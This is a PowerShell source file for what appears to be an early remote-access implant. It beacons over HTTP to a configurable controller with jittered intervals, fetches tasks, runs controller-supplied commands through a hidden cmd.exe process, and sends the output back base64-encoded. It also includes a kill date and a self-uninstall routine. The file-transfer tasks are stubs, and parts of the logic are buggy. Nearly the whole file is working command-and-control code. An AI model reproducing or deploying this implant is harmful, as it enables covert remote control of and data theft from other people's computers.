<#
    Update Configs
    Get file
    Run command
    Uninstall

    command batching / recipes?
#>

<#
    Task Result:
    - Task ID
    - Success/Failure
    - Optional Result Data | Error message
#>

$SyncedConfig = [hashtable]::Synchronized(@{
        ID              = ""
        Beacon          = @{
            PrimaryController   = @{
                IPAddress = "127.0.0.1"
                Port      = "8080"
                Route     = "beacon"
            }
            SecondaryController = @{
                IPAddress = ""
                Port      = ""
                Route     = ""
            }
            Interval            = 1
            SkewPercentage      = 0
            MaxFailures         = 3
            Failures            = 0
        }

        Sunset          = @{
            Absolute = $([datetime]::Now.AddSeconds(10))
            Relative = 0
        }

        Tasks           = @{
            Intake     = [System.Collections.Queue]::new()
            InProgress = [System.Collections.ArrayList]::new()
            Completed  = [System.Collections.ArrayList]::new()
        }

        Results         = @{
            Intake = [System.Collections.Queue]::new()
            Sent   = [System.Collections.ArrayList]::new()
        }

        ShouldUninstall = $false
        FailureCount    = 0
    })




$BeaconManager = {
    param($SyncedConfig)
    while ($SyncedConfig.ShouldUninstall -eq $false) {
        try {
            if ($SyncedConfig.ID -eq "") {
                $uri = ("http://{0}:{1}/{2}" -f $SyncedConfig.Beacon.PrimaryController.IPAddress, $SyncedConfig.Beacon.PrimaryController.Port, $SyncedConfig.Beacon.PrimaryController.Route)
                $body = @{
                    ID = $SyncedConfig.ID
                }
                $beaconResponse = Invoke-RestMethod -Method Post -Uri $uri -ContentType "application/json" -Body ($body | ConvertTo-Json)
            }
            else {
                $uri = ("http://{0}:{1}/{2}/{3}" -f $SyncedConfig.Beacon.PrimaryController.IPAddress, $SyncedConfig.Beacon.PrimaryController.Port, $SyncedConfig.Beacon.PrimaryController.Route, $SyncedConfig.ID)
                $beaconResponse = Invoke-RestMethod -Method Get -Uri $uri -ContentType "application/json"
            }

            # Successful beacon resets failures count
            $SyncedConfig.Beacon.Failures = 0

            # Process beacon configuration response
            # Might move this into a separate task
            $SyncedConfig.ID = $beaconResponse.ID
            $SyncedConfig.Beacon.PrimaryController.IPAddress = $beaconResponse.Beacon.PrimaryController.IPAddress
            $SyncedConfig.Beacon.PrimaryController.Port = $beaconResponse.Beacon.PrimaryController.Port
            $SyncedConfig.Beacon.PrimaryController.Route = $beaconResponse.Beacon.PrimaryController.Route

            $SyncedConfig.Beacon.SecondaryController.IPAddress = $beaconResponse.Beacon.SecondaryController.IPAddress
            $SyncedConfig.Beacon.SecondaryController.Port = $beaconResponse.Beacon.SecondaryController.Port
            $SyncedConfig.Beacon.SecondaryController.Route = $beaconResponse.Beacon.SecondaryController.Route

            $SyncedConfig.Beacon.CallbackInterval = $beaconResponse.Beacon.CallbackInterval
            $SyncedConfig.Beacon.SkewPercentage = $beaconResponse.Beacon.SkewPercentage
            $SyncedConfig.Beacon.MaxFailures = $beaconResponse.Beacon.MaxFailures

            # Process sunset if required
            if ($beaconResponse.Sunset.Absolute -ne "") {
                $SyncedConfig.Sunset.Absolute = [datetime]::Parse($beaconResponse.Sunset.Absolute)
            }

            # Queue new tasks
            if ($beaconResponse.TasksWaiting) {
                $uri = ("http://{0}:{1}/{2}/{3}/tasks" -f $SyncedConfig.Beacon.PrimaryController.IPAddress, $SyncedConfig.Beacon.PrimaryController.Port, $SyncedConfig.Beacon.PrimaryController.Route, $SyncedConfig.ID)
                $taskResponse = Invoke-RestMethod -Method Get -Uri $uri
                foreach ($task in $taskResponse) {
                    $SyncedConfig.Tasks.Intake.Enqueue(@{
                            ID       = $task.ID
                            TaskType = $task.TaskType
                            Args     = $task.Args
                            Status   = $task.Status
                            Output   = ""
                        })
                }
            }

            # Send outgoing mail
            if ($SyncedConfig.Results.Intake.Count -gt 0) {
                $id = $SyncedConfig.Results.Intake.Dequeue()
                $task = $SyncedConfig.Tasks.Completed.Where( { $_.ID -eq $id })[0]
                $SyncedConfig.Tasks.Completed.Remove($task)

                $output = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($task.Output))

                $mailBody = @{
                    ID       = $task.ID
                    TaskType = $task.TaskType
                    Args     = $task.Args
                    Status   = $task.Status
                    Output   = $output
                }

                $uri = ("http://{0}:{1}/{2}/{3}/task/{4}" -f $SyncedConfig.Beacon.PrimaryController.IPAddress, $SyncedConfig.Beacon.PrimaryController.Port, $SyncedConfig.Beacon.PrimaryController.Route, $SyncedConfig.ID, $id)
                $mailResponse = Invoke-RestMethod -Method Post -Uri $uri -ContentType "application/json" -Body ($mailBody | ConvertTo-Json)

                $SyncedConfig.Results.Sent.Add($id)
                $task = $null
            }
        }
        catch {
            $SyncedConfig.Beacon.Failures++
            if ($SyncedConfig.Beacon.Failures -ge $SyncedConfig.Beacon.MaxFailures) {
                $SyncedConfig.ShouldUninstall = $true
                break
            }           
        }

        $skew = Get-Random -Minimum 0 -Maximum $(($SyncedConfig.Beacon.CallbackInterval / 100) * $SyncedConfig.Beacon.SkewPercentage)
        if (Get-Random % 2 -eq 1) {
            $skew *= -1
        }
        $interval = $SyncedConfig.Beacon.CallbackInterval + $skew
        if ($interval -lt 0) {
            $interval = 0
        }
        Start-Sleep -Seconds $interval
    }
}

$SunsetManager = {
    param($SyncedConfig)
    while ($SyncedConfig.ShouldUninstall -eq $false) {
        if ([datetime]::Now -ge $SyncedConfig.Sunset.Absolute) {
            $SyncedConfig.ShouldUninstall = $true
        }
        else {
            Start-Sleep -Seconds 1
        }
    }
}

$ConfigurationTask = {
    param($SyncedConfig, $currentTask)
    # pass

    # Verify values are valid
    # apply new values to config
    # should i try to stamp changes into the script file?
    $currentTask.Status = "Completed"  
    $currentTask.Output = "This is dummy output from Configure" 
}

$DownloadTask = {
    param($SyncedConfig, $currentTask)
    # pass
    $currentTask.Status = "Completed"
    $currentTask.Output = $currentTask.Args
}

$UploadTask = {
    param($SyncedConfig, $currentTask)
    # pass
    $currentTask.Status = "Completed"
    $currentTask.Output = $currentTask.Args
}

$ShellExecuteTask = {
    param($SyncedConfig, $currentTask)
    try {
        $procInfo = [System.Diagnostics.ProcessStartInfo]::new()
        $procInfo.FileName = "cmd.exe"
        $procInfo.CreateNoWindow = $true
        $procInfo.RedirectStandardOutput = $true
        $procInfo.RedirectStandardError = $true
        $procInfo.UseShellExecute = $false
        $procInfo.Arguments = ("/c {0}" -f $currentTask.Args)

        $proc = [System.Diagnostics.Process]::new()
        $proc.StartInfo = $procInfo
        [void]$proc.Start()

        $currentTask.Proc = $proc
    }
    catch {
        $currentTask.Status = "Failed"
        $currentTask.Output = "Couldn't start cmd.exe process to execute"
    }

    try {
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit()
    }
    catch {
        $currentTask.Status = "Failed"
        $currentTask.Output = "Failed to read output from shell command"
    }

    if ($currentTask.Status -ne "Failed") {
        $currentTask.Status = "Success"
    }
    if ($currentTask.Output -eq "") {
        $currentTask.Output = $stdout + $stderr
    }

    $currentTask = @{
        ID       = $currentTask.ID
        Status   = $currentTask.Status
        TaskType = $currentTask.TaskType
        Args     = $currentTask.Args
        Output   = $currentTask.Output
    }
}

$UninstallTask = {
    param($SyncedConfig, $currentTask)
    try {
        $SyncedConfig.Sunset = @{
            Absolute = $([datetime]::Now.AddDays(-1))
            Relative = 0
        }
        $currentTask.Status = "Success"
    }
    catch {
        $currentTask.Status = "Failed"
    }
}

$TaskManager = {
    param($SyncedConfig, $ConfigurationTask, $DownloadTask, $UploadTask, $ShellExecuteTask, $UninstallTask)

    $tmState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
    $tmPool = [runspacefactory]::CreateRunspacePool(1, 10, $tmState, $Host)
    $tmPool.Open()

    while ($SyncedConfig.ShouldUninstall -eq $false) {
        # Process incoming tasks
        if ($SyncedConfig.Tasks.Intake.Count -gt 0) {
            $currentTask = $SyncedConfig.Tasks.Intake.Dequeue()
            $currentTask.Status = "Running"

            $powershell = [powershell]::Create()
            $powershell.RunspacePool = $tmPool
            switch ($currentTask.TaskType) {
                "Configure" {
                    [void]$powershell.AddScript($ConfigurationTask).AddArgument($SyncedConfig).AddArgument($currentTask)
                    break
                }
                "Download" { 
                    [void]$powershell.AddScript($DownloadTask).AddArgument($SyncedConfig).AddArgument($currentTask)
                    break
                }
                "Upload" {
                    [void]$powershell.AddScript($UploadTask).AddArgument($SyncedConfig).AddArgument($currentTask)
                    break
                }
                "ShellExecute" { 
                    [void]$powershell.AddScript($ShellExecuteTask).AddArgument($SyncedConfig).AddArgument($currentTask)
                    break
                }
                "Uninstall" {
                    [void]$powershell.AddScript($UninstallTask).AddArgument($SyncedConfig).AddArgument($currentTask)
                    break
                }
                default { 
                    # invalid tasktype
                    $currentTask.Status = "Failed"
                    $currentTask.Output = "Invalid TaskType"
                    $SyncedConfig.Tasks.Completed.Add($currentTask)
                    $powershell = $null
                    continue
                }
            }
            $task = @{
                Task = $currentTask
                Job  = $powershell.BeginInvoke()
                PoSh = $powershell
            }
            $SyncedConfig.Tasks.InProgress.Add($task)
        }
        # Process completed and failed tasks
        if ($SyncedConfig.Tasks.InProgress.Count -gt 0) {
            $completed = $SyncedConfig.Tasks.InProgress.Where( { $_.Job.IsCompleted -eq $true })
            foreach ($task in $completed) {
                $SyncedConfig.Tasks.InProgress.Remove($task)
                $SyncedConfig.Tasks.Completed.Add($task.Task)

                $SyncedConfig.Results.Intake.Enqueue($task.Task.ID)
            }
        }

        # Reap orphans :)
        if ($syncedConfig.Tasks.InProgress.Count -gt 0) {
            foreach ($task in $syncedConfig.Tasks.InProgress) {
                [void](Get-WmiObject -Class Win32_Process).Where( {
                        $_.ParentProcessId -eq $task.Task.proc.id
                    }).Terminate()
                $task.proc.Kill()

                $task.Task.Status = "Failed"
                $SyncedConfig.Tasks.InProgress.Remove($task)
                $SyncedConfig.Tasks.Completed.Add($task.Task)
                $SyncedConfig.FailureCount++

                $SyncedConfig.Results.Intake.Enqueue($task.Task.ID)
            }
        }
    }
}


$State = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
$Pool = [runspacefactory]::CreateRunspacePool(1, 13, $State, $Host)
$Pool.Open()

$jobs = @()

$sunset = [powershell]::Create()
$sunset.RunspacePool = $Pool
[void]$sunset.AddScript($SunsetManager).AddArgument($SyncedConfig)
$jobs += $sunset.BeginInvoke()

$beacon = [powershell]::Create()
$beacon.RunspacePool = $Pool
[void]$beacon.AddScript($BeaconManager).AddArgument($SyncedConfig)
$jobs += $beacon.BeginInvoke()

$tasks = [powershell]::Create()
$tasks.RunspacePool = $Pool
[void]$tasks.AddScript($TaskManager).AddArgument($SyncedConfig).AddArgument($ConfigurationTask).AddArgument($DownloadTask).AddArgument($UploadTask).AddArgument($ShellExecuteTask).AddArgument($UninstallTask)
$jobs += $tasks.BeginInvoke()


do {
    Start-Sleep -Seconds 1  
} until ($SyncedConfig.ShouldUninstall -eq $true)


foreach ($runspace in (Get-Runspace).Where( { $_.Id -gt 1 } )) {
    [void]$runspace.Close()
    [void]$runspace.Dispose()
}

# Probably should clean-up if on disk or something, idk